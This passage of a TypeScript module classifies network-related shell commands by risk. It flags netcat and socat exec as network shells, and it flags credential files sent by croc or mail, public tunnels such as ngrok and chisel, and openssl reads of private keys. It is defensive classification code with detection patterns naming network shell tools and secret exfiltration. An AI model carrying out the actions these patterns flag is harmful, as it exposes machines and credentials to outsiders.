  const local = hosts.length > 0 && hosts.every(isLocalHost);
  return {
    capability: 'net.send',
    reach: local ? 'machine' : 'external',
    exposure: 'can-exfiltrate',
    reversibility: 'irreversible',
    opaque: true,
    note: 'opens a file transfer session, which can move files in either direction once it is running',
    pathArgs: 'none',
    targets: hosts.map(hostTarget),
  };
}

const ARIA2_SHORT_WITH_VALUE: ReadonlySet<string> = new Set([
  'd', 'o', 'i', 'j', 's', 'x', 'k', 'm', 't', 'l', 'u', 'n',
]);

function classifyAria2(argv: string[], ctx: KnowledgeCtx): Judgement {
  const p = parseOpts(argv, new Set(['--dir', '--out', '--input-file', '--log', '--max-tries']), ARIA2_SHORT_WITH_VALUE);
  const hosts = uniq(p.positionals.map(targetHost).filter((h): h is string => !!h));

  // The completion hooks run an arbitrary program, which has nothing to do
  // with downloading and everything to do with what happens next.
  const hook = argv.some((a, i) => i > 0 && /^--on-(bt-)?download-(start|complete|stop|error|pause)\b/.test(a));
  if (hook) {
    return {
      capability: 'exec.unknown',
      opaque: true,
      reach: 'machine',
      note: 'downloads a file and then runs a program of its own choosing',
      pathArgs: 'none',
      targets: hosts.map(hostTarget),
    };
  }

  const dests = [optValue(p, '-d', '--dir'), optValue(p, '-o', '--out')].filter(
    (d): d is string => !!d,
  );

  // `-i list.txt` takes the urls out of a file, so neither the hosts nor the
  // filenames written are anywhere in argv.
  const inputFile = optValue(p, '-i', '--input-file');
  if (inputFile !== undefined) {
    const j = downloadJudgement(
      ctx,
      dests,
      hosts,
      'downloads every url listed in a file',
      'many',
      [pathTarget(ctx, inputFile)],
    );
    j.opaque = true;
    return j;
  }

  return downloadJudgement(
    ctx,
    dests,
    hosts,
    `downloads ${hostLabel(hosts)} to a file`,
    p.positionals.length > 1 ? 'many' : 'single',
  );
}

function classifyCroc(argv: string[], ctx: KnowledgeCtx): Judgement {
  const args = nonFlags(argv);
  const sending = args[0] === 'send' || sawOpt(parseOpts(argv, new Set(['--code']), new Set(['c'])), '--send');
  if (sending) {
    const files = args.slice(1);
    const secret = anySecret(ctx, files);
    return {
      capability: 'net.send',
      reach: 'external',
      exposure: 'can-exfiltrate',
      reversibility: 'irreversible',
      scale: files.length > 1 ? 'many' : 'single',
      note: secret
        ? `sends ${secret}, a credential file, through a public relay to whoever has the code`
        : 'sends files through a public relay to whoever has the code',
      pathArgs: 'none',
      targets: files.map((f) => pathTarget(ctx, f)),
    };
  }
  return downloadJudgement(ctx, [], [], 'receives files into the current directory', 'many');
}

// --- raw sockets and tunnels ----------------------------------------------

const NC_SHORT_WITH_VALUE: ReadonlySet<string> = new Set([
  'e', 'c', 'p', 's', 'w', 'q', 'i', 'X', 'x', 'o', 'T', 'm', 'g', 'G', 'I', 'O',
]);

function classifyNetcat(argv: string[]): Judgement {
  const p = parseOpts(argv, new Set(['--exec', '--sh-exec', '--lua-exec', '--listen', '--source-port', '--proxy']), NC_SHORT_WITH_VALUE);
  const host = p.positionals[0];
  const h = host ? bareHost(host) : undefined;
  const targets = h ? [hostTarget(h)] : [];
  const listening = sawOpt(p, '-l', '-L', '--listen', '-k');
  const execing = sawOpt(p, '-e', '-c', '--exec', '--sh-exec', '--lua-exec');

  // A socket wired to a program is a shell on the network. There is no
  // recovering from one of these having run, so it is the ceiling of this
  // whole module.
  if (execing) {
    return {
      capability: 'exec.remote',
      reach: 'external',
      reversibility: 'irreversible',
      exposure: 'can-exfiltrate',
      note: listening
        ? 'opens a shell on this machine for whoever connects to it'
        : 'opens a shell to another machine',
      pathArgs: 'none',
      targets,
    };
  }
  if (listening) {
    return {
      capability: 'exec.remote',
      reach: 'external',
      reversibility: 'hard',
      exposure: 'can-exfiltrate',
      note: 'listens for an incoming connection from another machine',
      pathArgs: 'none',
      targets,
    };
  }
  return {
    capability: 'net.send',
    reach: isLocalHost(h) ? 'machine' : 'network',
    exposure: 'can-exfiltrate',
    reversibility: 'irreversible',
    note: `opens a raw connection to ${h ?? 'another machine'} that can push anything piped into it`,
    pathArgs: 'none',
    targets,
  };
}

function classifySocat(argv: string[]): Judgement {
  const addrs = argv.slice(1).filter((a) => !a.startsWith('-'));
  const joined = addrs.join(' ');
  const hosts = uniq(
    addrs
      .flatMap((a) => a.split(/[,:]/).filter((part) => /^[a-z0-9][a-z0-9.-]*$/i.test(part)))
      .map(targetHost)
      .filter((x): x is string => !!x),
  );
  const targets = hosts.map(hostTarget);

  if (/\b(exec|system|shell)\s*:/i.test(joined)) {
    return {
      capability: 'exec.remote',
      reach: 'external',
      reversibility: 'irreversible',
      exposure: 'can-exfiltrate',
      note: 'wires a program to a network connection, which is a shell to another machine',
      pathArgs: 'none',
      targets,
    };
  }
  // Both spellings of every listener: `TCP-LISTEN`, and the `TCP4-L` /
  // `UDP6-L` abbreviations, which the address may also be the second argument
  // rather than the first — so whitespace counts as a boundary too.
  if (
    /\b[a-z0-9-]*listen\b/i.test(joined) ||
    /(^|[\s,:])(tcp|udp|unix|openssl|sctp|socks|dccp|vsock|abstract)[46]?-l(?:$|[\s,:])/i.test(joined)
  ) {
    return {
      capability: 'exec.remote',
      reach: 'external',
      reversibility: 'hard',
      exposure: 'can-exfiltrate',
      note: 'listens for connections from other machines and pipes them somewhere on this one',
      pathArgs: 'none',
      targets,
    };
  }
  // socat address syntax can name files, devices, ttys, sockets and programs.
  // Without pinning down both ends there is no honest reading of argv.
  return {
    capability: 'net.send',
    reach: 'network',
    exposure: 'can-exfiltrate',
    reversibility: 'irreversible',
    opaque: true,
    note: 'pipes data between a network connection and something else on this machine',
    pathArgs: 'none',
    targets,
  };
}

/** Tunnels that publish a local port on the public internet. */
function exposeJudgement(note: string, targets: NetTarget[] = []): Judgement {
  return {
    capability: 'exec.remote',
    reach: 'external',
    reversibility: 'hard',
    exposure: 'can-exfiltrate',
    scale: 'many',
    note,
    pathArgs: 'none',
    targets,
  };
}

function classifyTunnel(name: string, argv: string[]): Judgement {
  const args = nonFlags(argv);
  // The subcommand is not reliably args[0]: `nonFlags` keeps the VALUE of a
  // separated option, so `ngrok --config /tmp/c.yml http 80` puts a path there
  // and reading only the first word calls a public tunnel a management
  // command. Every one of these subcommand words is unambiguous, so look for
  // it anywhere in the non-flag arguments.
  const said = (...words: string[]): boolean => {
    const set = new Set(args.map((a) => a.toLowerCase()));
    return words.some((w) => set.has(w));
  };

  if (name === 'ngrok') {
    if (said('http', 'tcp', 'tls', 'start', 'tunnel')) {
      return exposeJudgement(
        'puts a port on this machine on the public internet, where anyone with the url can reach it',
      );
    }
    return { capability: 'exec.inspect', note: 'runs an ngrok management command', pathArgs: 'none' };
  }

  if (name === 'cloudflared') {
    if (said('tunnel', 'access')) {
      return exposeJudgement(
        'puts a service on this machine on the public internet through cloudflare',
      );
    }
    return { capability: 'exec.inspect', note: 'runs a cloudflared management command', pathArgs: 'none' };
  }

  if (name === 'localtunnel' || name === 'lt') {
    return exposeJudgement(
      'puts a port on this machine on the public internet, where anyone with the url can reach it',
    );
  }

  if (name === 'frpc' || name === 'frps' || name === 'frp') {
    // frp reads its real configuration from a file, so which ports get
    // published is not in argv.
    const j = exposeJudgement('publishes local ports through a relay server on the public internet');
    j.opaque = true;
    return j;
  }

  if (name === 'chisel') {
    if (said('server')) {
      return exposeJudgement('runs a tunnel server that lets other machines reach this one');
    }
    const host = args.map(targetHost).find((h): h is string => !!h);
    return exposeJudgement(
      'builds a tunnel to another machine that can carry traffic in both directions',
      host ? [hostTarget(host)] : [],
    );
  }

  // tailscale
  if (said('funnel')) {
    return exposeJudgement(
      'puts a port on this machine on the public internet, where anyone with the url can reach it',
    );
  }
  if (said('serve')) {
    return exposeJudgement('publishes a port on this machine to everyone on the private network');
  }
  if (said('ssh')) {
    return {
      capability: 'exec.remote',
      reach: 'external',
      reversibility: 'hard',
      note: 'runs commands on another machine',
      pathArgs: 'none',
    };
  }
  if (said('file')) {
    return {
      capability: 'net.send',
      reach: 'external',
      exposure: 'can-exfiltrate',
      reversibility: 'irreversible',
      note: 'sends files to another machine on the private network',
      pathArgs: 'none',
    };
  }
  if (said('up', 'login', 'switch', 'set', 'cert')) {
    return {
      capability: 'exec.remote',
      reach: 'external',
      reversibility: 'hard',
      note: 'joins this machine to a private network that other machines can reach it on',
      pathArgs: 'none',
    };
  }
  if (said('down', 'logout')) {
    return {
      capability: 'exec.process',
      reach: 'machine',
      reversibility: 'easy',
      note: 'disconnects this machine from the private network',
      pathArgs: 'none',
    };
  }
  return { capability: 'exec.inspect', reach: 'machine', note: 'reports network status', pathArgs: 'none' };
}

function classifyTelnet(argv: string[]): Judgement {
  const host = nonFlags(argv).map(bareHost).find((h): h is string => !!h);
  // telnet is used both as a poor man's port scanner and as a login shell on
  // the far end; argv does not distinguish them, so assume the login.
  return {
    capability: 'exec.remote',
    reach: isLocalHost(host) ? 'machine' : 'external',
    reversibility: 'hard',
    exposure: 'can-exfiltrate',
    note: 'opens an interactive session on another machine',
    pathArgs: 'none',
    targets: host ? [hostTarget(host)] : [],
  };
}

// --- diagnostics -----------------------------------------------------------

const DIAGNOSTICS = [
  'ping', 'ping6', 'traceroute', 'traceroute6', 'tracert', 'tracepath',
  'dig', 'nslookup', 'host', 'whois', 'mtr', 'arp', 'ipconfig',
];

/**
 * Counts, ports, packet sizes and interfaces all arrive as option values here
 * (`ping -c 1 host`), so the walker has to consume them or `1` ends up
 * recorded as a hostname.
 */
const DIAG_SHORT_WITH_VALUE: ReadonlySet<string> = new Set([
  'c', 'i', 'I', 'W', 'w', 't', 's', 'S', 'M', 'p', 'Q', 'l', 'm', 'q', 'f', 'g', 'b', 'T', 'y', 'k', 'x',
]);

function classifyDiagnostic(name: string, argv: string[]): Judgement {
  const p = parseOpts(argv, new Set<string>(), DIAG_SHORT_WITH_VALUE);
  const hosts = uniq(p.positionals.map(bareHost).filter((h): h is string => !!h));
  if (name === 'arp' || name === 'ipconfig') {
    // Both of these have a write half hiding behind a one-letter switch:
    // `arp -d`/`-s` rewrite the arp cache and `ipconfig /release` drops this
    // machine off the network. Neither is the read-only lookup below.
    const changes = argv
      .slice(1)
      .some((a) => /^[-/](release6?|renew6?|flushdns|registerdns|setclassid6?|[ds])$/i.test(a));
    if (changes) {
      return {
        capability: 'exec.process',
        reach: 'machine',
        reversibility: 'easy',
        note: 'changes this machine\'s network state',
        pathArgs: 'none',
      };
    }
    return {
      capability: 'exec.inspect',
      reach: 'machine',
      note: 'shows this machine\'s network configuration',
      pathArgs: 'none',
    };
  }
  const note =
    name === 'whois' ? 'looks up who registered a domain'
    : name === 'dig' || name === 'nslookup' || name === 'host' ? 'looks up a name in dns'
    : 'checks whether a host is reachable';
  // These read nothing and change nothing; `exec.inspect` keeps them quiet
  // while `reach: network` still records that a name left the machine.
  return {
    capability: 'exec.inspect',
    reach: 'network',
    note,
    pathArgs: 'none',
    targets: hosts.map(hostTarget),
  };
}

// --- email -----------------------------------------------------------------

const MAILERS = ['sendmail', 'mail', 'mailx', 's-nail', 'mutt', 'neomutt', 'msmtp'];

function classifyMailer(argv: string[], ctx: KnowledgeCtx): Judgement {
  // `-a` attaches a file in mutt and mailx; `-s` is the subject; the bare
  // arguments are recipients.
  const p = parseOpts(argv, new Set(['--attach', '--subject']), new Set(['s', 'a', 'c', 'b', 'r', 'f', 'F', 'i', 'H', 'e']));
  const recipients = p.positionals.filter((a) => a.includes('@'));
  const attachments = optValues(p, '-a', '--attach').filter((a) => !a.includes('='));
  const secret = anySecret(ctx, attachments);
  const domains = uniq(
    recipients.map((r) => r.split('@')[1]?.toLowerCase()).filter((d): d is string => !!d),
  );
  const who = domains.length === 1 ? domains[0]! : recipients.length > 0 ? 'several addresses' : 'a recipient';
  return {
    capability: 'net.send',
    reach: 'external',
    exposure: 'can-exfiltrate',
    reversibility: 'irreversible',
    // Almost every dangerous use of these reads the body from a pipe, so the
    // note has to make the stdin case visible too.
    note: secret
      ? `emails ${secret}, a credential file, to ${who}`
      : attachments.length > 0
        ? `emails ${attachments[0]!} to ${who}`
        : `emails whatever it is given to ${who}, which takes it off this machine`,
    pathArgs: 'none',
    targets: [...domains.map(hostTarget), ...attachments.map((a) => pathTarget(ctx, a))],
  };
}

// --- ssh key tooling -------------------------------------------------------

/**
 * ssh-keygen's value-taking short options, so a bundle stops at the first one
 * and `-f ~/.ssh/id_rsa` does not leave the filename looking like more flags.
 */
const SSHKEYGEN_SHORT_WITH_VALUE: ReadonlySet<string> = new Set([
  'a', 'b', 'C', 'c', 'D', 'E', 'F', 'f', 'G', 'I', 'J', 'j', 'K', 'k', 'M', 'm',
  'N', 'n', 'O', 'P', 'Q', 'R', 'r', 'S', 's', 't', 'V', 'w', 'Y', 'Z',
]);

function classifySshTool(name: string, argv: string[], ctx: KnowledgeCtx): Judgement {
  const args = nonFlags(argv);

  if (name === 'ssh-keygen') {
    // ssh-keygen is a getopt program, so `-yf key` is `-y -f key`. `hasFlag`
    // only matches a whole argument, and the bundled spelling walked straight
    // past every branch here into "creates a new key pair".
    const kg = parseOpts(argv, new Set<string>(), SSHKEYGEN_SHORT_WITH_VALUE);
    const keyFile = optValue(kg, '-f') ?? flagValue(argv, '-f');
    const keyTarget = keyFile ? [pathTarget(ctx, keyFile)] : [];
    // `-y` prints the public half, which requires reading the private key;
    // `-p`/`-P` change the passphrase on one; `-Y` signs with one.
    if (sawOpt(kg, '-y', '-p', '-P', '-Y')) {
      const rewrites = sawOpt(kg, '-p');
      return {
        capability: 'secret.read',
        reach: 'machine',
        // `-p` does not just read the key, it writes it back with a new
        // passphrase — over the only copy that exists.
        reversibility: rewrites ? 'hard' : 'trivial',
        note: rewrites
          ? 'rewrites a private key file with a new passphrase'
          : 'reads a private key file',
        pathArgs: 'none',
        targets: keyTarget,
      };
    }
    if (sawOpt(kg, '-l', '-L', '-F', '-B')) {
      return {
        capability: 'exec.inspect',
        reach: 'machine',
        note: 'inspects an ssh key or the known hosts file',
        pathArgs: 'none',
        targets: keyTarget,
      };
    }
    if (sawOpt(kg, '-R')) {
      return {
        capability: 'fs.write.outside',
        reach: 'machine',
        reversibility: 'easy',
        note: 'removes a host from the known hosts file',
        pathArgs: 'none',
        targets: keyTarget,
      };
    }
    const outside = keyTarget.length === 0 || keyTarget.some((t) => !t.inWorkspace);
    return {
      capability: outside ? 'fs.write.outside' : 'fs.write.workspace',
      reach: outside ? 'machine' : 'workspace',
      reversibility: 'hard',
      note: 'creates a new ssh key pair on disk',
      pathArgs: 'none',
      targets: keyTarget,
    };
  }

  if (name === 'ssh-copy-id') {
    const host = args.map((a) => remoteSpec(a)?.host ?? bareHost(a)).find((h): h is string => !!h);
    const keyFile = flagValue(argv, '-i');
    return {
      capability: 'exec.remote',
      reach: 'external',
      reversibility: 'hard',
      note: 'installs a login key on another machine, so it will accept this one from now on',
      pathArgs: 'none',
      targets: [
        ...(host ? [hostTarget(host)] : []),
        ...(keyFile ? [pathTarget(ctx, keyFile)] : []),
      ],
    };
  }

  if (name === 'ssh-add') {
    if (hasFlag(argv, '-l', '-L', '-T')) {
      return { capability: 'exec.inspect', reach: 'machine', note: 'lists the keys the ssh agent holds', pathArgs: 'none' };
    }
    if (hasFlag(argv, '-d', '-D', '-x', '-X')) {
      return { capability: 'meta', note: 'changes what the ssh agent is holding', pathArgs: 'none' };
    }
    return {
      capability: 'secret.read',
      reach: 'machine',
      note: 'loads a private key into the ssh agent',
      pathArgs: 'none',
      targets: args.map((a) => pathTarget(ctx, a)),
    };
  }

  // ssh-keyscan
  const hosts = uniq(args.map(bareHost).filter((h): h is string => !!h));
  return {
    capability: 'net.fetch',
    reach: hosts.every(isLocalHost) ? 'machine' : 'network',
    note: 'collects host keys by connecting to other machines',
    scale: hosts.length > 1 ? 'many' : 'single',
    pathArgs: 'none',
    targets: hosts.map(hostTarget),
  };
}

// --- openssl ---------------------------------------------------------------

/** openssl uses single-dash long options (`-in`, `-connect`), not clusters. */
function opensslValue(argv: string[], flag: string): string | undefined {
  for (let i = 1; i < argv.length - 1; i++) {
    if (argv[i] === flag) return argv[i + 1];
  }
  return undefined;
}

const OPENSSL_KEY_SUBCOMMANDS = ['rsa', 'dsa', 'ec', 'pkey', 'pkcs8', 'pkcs12', 'gendsa'];
const OPENSSL_GENERATORS = ['genrsa', 'genpkey', 'ecparam', 'req', 'dhparam'];
const OPENSSL_INSPECTORS = [
  'x509', 'crl', 'dgst', 'asn1parse', 'verify', 'ciphers', 'version', 'rand', 'base64',
  'speed', 'errstr', 'prime', 'nseq', 'sess_id', 'crl2pkcs7',
];

function classifyOpenssl(argv: string[], ctx: KnowledgeCtx): Judgement {
  const sub = (firstNonFlag(argv) ?? '').toLowerCase();
  const inFile = opensslValue(argv, '-in');
  const outFile = opensslValue(argv, '-out');

  if (OPENSSL_KEY_SUBCOMMANDS.includes(sub)) {
    // `-out` on one of these does not just read the key, it writes a second
    // copy of it — and without `-aes256` and friends that copy is the
    // passphrase-free version, which is the whole point of running it.
    const keyCopy = outFile ? pathTarget(ctx, outFile) : undefined;
    return {
      capability: 'secret.read',
      reach: 'machine',
      reversibility: keyCopy ? 'hard' : 'trivial',
      note: keyCopy
        ? 'reads private key material and writes a copy of it to disk'
        : 'reads private key material',
      pathArgs: 'none',
      targets: [
        ...(inFile ? [pathTarget(ctx, inFile)] : []),
        ...(keyCopy ? [keyCopy] : []),
      ],
    };
  }

  if (sub === 'enc') {
    // Decryption needs the key, and the plaintext it produces is usually the
    // thing that was worth protecting.
    if (hasFlag(argv, '-d')) {
      return {
        capability: 'secret.read',
        reach: 'machine',
        note: 'decrypts a file using a key or passphrase',
        pathArgs: 'none',
        targets: [
          ...(inFile ? [pathTarget(ctx, inFile)] : []),
          ...(outFile ? [pathTarget(ctx, outFile)] : []),
        ],
      };
    }
    const t = outFile ? pathTarget(ctx, outFile) : undefined;
    const outside = t ? !t.inWorkspace : true;
    return {
      capability: outside ? 'fs.write.outside' : 'fs.write.workspace',
      reach: outside ? 'machine' : 'workspace',
      note: 'encrypts a file',
      pathArgs: 'none',
      targets: t ? [t] : [],
    };
  }

  if (OPENSSL_GENERATORS.includes(sub)) {
    const keyOut = opensslValue(argv, '-keyout') ?? outFile;
    const t = keyOut ? pathTarget(ctx, keyOut) : undefined;
    const outside = t ? !t.inWorkspace : false;
    return {
      capability: outside ? 'fs.write.outside' : 'fs.write.workspace',
      reach: outside ? 'machine' : 'workspace',
      reversibility: 'hard',
      note: 'generates new key material and writes it to disk',
      pathArgs: 'none',
      targets: t ? [t] : [],
    };
  }

  if (sub === 's_client') {
    const connect = opensslValue(argv, '-connect') ?? opensslValue(argv, '-proxy');
    const h = connect ? targetHost(connect) ?? connect.split(':')[0]?.toLowerCase() : undefined;
    return {
      capability: 'net.fetch',
      reach: isLocalHost(h) ? 'machine' : 'network',
      note: 'opens a tls connection to another machine',
      pathArgs: 'none',
      targets: h ? [hostTarget(h)] : [],
    };
  }

  if (sub === 's_server') {
    return {
      capability: 'exec.remote',
      reach: 'external',
      reversibility: 'hard',
      exposure: 'can-exfiltrate',
      note: 'listens for tls connections from other machines',
      pathArgs: 'none',
    };
  }

  if (OPENSSL_INSPECTORS.includes(sub)) {
    // These read by default, but two switches change that and both are on the
    // ordinary path: `-sign`/`-signkey`/`-inkey` hands the subcommand a private
    // key, and `-out` makes any of them a writer —
    // `openssl rand -out ~/.bashrc 4096` fills a file with random bytes.
    const signKey =
      opensslValue(argv, '-sign') ??
      opensslValue(argv, '-signkey') ??
      opensslValue(argv, '-inkey');
    const written = outFile ? pathTarget(ctx, outFile) : undefined;
    if (signKey !== undefined) {
      return {
        capability: 'secret.read',
        reach: 'machine',
        reversibility: written ? 'hard' : 'trivial',
        note: 'reads a private key to sign something',
        pathArgs: 'none',
        targets: [
          ...(inFile ? [pathTarget(ctx, inFile)] : []),
          pathTarget(ctx, signKey),
          ...(written ? [written] : []),
        ],
      };
    }
    if (written) {
      const outside = !written.inWorkspace;
      return {
        capability: outside ? 'fs.write.outside' : 'fs.write.workspace',
        reach: outside ? 'machine' : 'workspace',
        note: 'writes its output over a file',
        pathArgs: 'none',
        targets: [...(inFile ? [pathTarget(ctx, inFile)] : []), written],
      };
    }
    return {
      capability: 'exec.inspect',
      note: 'inspects a certificate or computes a digest',
      pathArgs: 'none',
      targets: inFile ? [pathTarget(ctx, inFile)] : [],
    };
  }

  // openssl has dozens of subcommands and several of them read keys or write
  // files; guessing on an unrecognised one is not worth the quiet.
  return {
    capability: 'exec.unknown',
    reach: 'machine',
    opaque: true,
    note: 'runs an openssl subcommand that may read keys or write files',
    pathArgs: 'none',
  };
}

// --- module ----------------------------------------------------------------

/**
 * `wget -e <directive>` injects a wgetrc directive on the command line, which
 * can redirect output, set a proxy, or point at a different config — the
 * command line no longer says what the command does.
 */
const WGET_EXECUTES_CONFIG = /^(-e|--execute)$/;

export const network: ProgramKnowledge = {
  names: [
    'curl', 'wget', 'wget2', 'http', 'https', 'httpie', 'xh', 'xhs', 'curlie',
    'scp', 'sftp', 'rsync', 'ftp', 'lftp', 'aria2c', 'croc',
    'nc', 'netcat', 'ncat', 'nc.traditional', 'nc.openbsd', 'socat', 'telnet',
    'chisel', 'ngrok', 'cloudflared', 'localtunnel', 'lt', 'frpc', 'frps', 'frp', 'tailscale',
    ...DIAGNOSTICS,
    ...MAILERS,
    'ssh-keygen', 'ssh-copy-id', 'ssh-add', 'ssh-keyscan', 'openssl',
  ],
  describe:
    'Programs that move data on and off the machine: http clients, file transfer, tunnels, mail, and key tools',

  classify(argv, ctx) {
    const name = argv[0]!;

    if (name === 'curl') return classifyCurl(argv, ctx);
    // curlie is curl's flags with httpie's argument grammar, so it needs both
    // parsers' worth of attention: `curlie POST api.example.com token=SECRET`
    // has no `-d` anywhere in argv.
    if (name === 'curlie') return classifyCurl(argv, ctx, true);
    if (name === 'wget' || name === 'wget2') {
      if (argv.some((a, i) => i > 0 && WGET_EXECUTES_CONFIG.test(a))) {
        return {
          capability: 'net.fetch',
          reach: 'network',
          opaque: true,
          note: 'sets wgetrc directives on the command line, which can change where the download goes',
        };
      }
      return classifyWget(argv, ctx);
    }
    if (name === 'http' || name === 'https' || name === 'httpie' || name === 'xh' || name === 'xhs') {
      return classifyHttpie(argv, ctx);
    }

    if (name === 'scp' || name === 'rsync') return classifyCopier(name, argv, ctx);
    if (name === 'sftp' || name === 'ftp' || name === 'lftp') return classifyInteractiveTransfer(argv);
    if (name === 'aria2c') return classifyAria2(argv, ctx);
    if (name === 'croc') return classifyCroc(argv, ctx);

    if (name === 'nc' || name === 'netcat' || name === 'ncat' || name === 'nc.traditional' || name === 'nc.openbsd') {
      return classifyNetcat(argv);
    }
    if (name === 'socat') return classifySocat(argv);
    if (name === 'telnet') return classifyTelnet(argv);
    if (['chisel', 'ngrok', 'cloudflared', 'localtunnel', 'lt', 'frpc', 'frps', 'frp', 'tailscale'].includes(name)) {
      return classifyTunnel(name, argv);
    }

    if (DIAGNOSTICS.includes(name)) return classifyDiagnostic(name, argv);
    if (MAILERS.includes(name)) return classifyMailer(argv, ctx);

    if (name === 'ssh-keygen' || name === 'ssh-copy-id' || name === 'ssh-add' || name === 'ssh-keyscan') {
      return classifySshTool(name, argv, ctx);
    }
    if (name === 'openssl') return classifyOpenssl(argv, ctx);

    return null;
  },
};
